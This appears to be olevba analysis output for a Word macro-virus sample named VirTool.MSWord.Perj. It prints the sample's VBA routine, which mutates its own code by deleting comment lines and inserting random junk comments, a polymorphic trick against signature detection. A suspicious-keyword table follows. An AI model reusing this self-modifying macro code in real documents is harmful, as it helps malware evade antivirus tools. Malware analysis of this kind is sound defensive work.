olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Perj-e2d8ce8846477cbe8cd6ca42406118f0c92f0dd8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Perj-e2d8ce8846477cbe8cd6ca42406118f0c92f0dd8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: VirTool.MSWord.Perj-e2d8ce8846477cbe8cd6ca42406118f0c92f0dd8 - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub RndmJnkr()
For V1 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
V2 = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1), 1, 1)
If V2 = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines V1, 1
Next V1
For V3 = 1 To Int(Rnd() * 49 + 1)
V4 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
V5 = Int(Rnd() * V4 + 1)
V6 = Int(Rnd() * 99 + 1)
For V7 = 1 To V6
V8 = V8 + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next V7
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines V5, "'" & V8
V8 = ""
Next V3
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

